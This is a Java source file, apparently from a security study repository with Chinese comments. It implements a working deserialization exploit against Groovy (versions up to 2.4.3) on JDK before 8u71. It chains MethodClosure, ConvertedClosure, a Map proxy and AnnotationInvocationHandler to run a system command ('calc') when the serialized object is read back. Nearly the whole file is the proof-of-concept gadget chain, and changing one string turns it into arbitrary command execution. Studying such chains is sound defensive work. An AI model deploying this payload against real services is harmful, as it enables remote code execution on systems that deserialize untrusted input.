package org.example;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.util.Map;

/**
 * 基于cc1链的反序列化漏洞
 * jdk < 8u71
 * groovy <= 2.4.3 更高的版本禁止MethodClosure反序列化
 */
public class GroovyDeSerializeLeak {
    final static String binFilePath = "expression-injection/groovy/src/main/resources/ser.bin";
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(binFilePath));
        oos.writeObject(obj);
    }


    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception {
        MethodClosure methodClosure = new MethodClosure("calc", "execute");
        // 封装methodClosure对象到ConvertedClosure这个handler里面，然后传入entrySet赋值到method_name里面
        ConvertedClosure convertedClosure = new ConvertedClosure(methodClosure, "entrySet");

        // 构造Proxy动态代理
        Map mapProxy = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class[]{Map.class}, convertedClosure);


        // AnnotationInvocationHandler：readObject所在，需要通过构造函数将Proxy对象传入到membervalue处
        Class readObjectHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationhdlConstructor = readObjectHandler.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationhdlConstructor.setAccessible(true);
        Object o = annotationInvocationhdlConstructor.newInstance(Target.class, mapProxy);

        serialize(o);
        unserialize(binFilePath);
    }
}

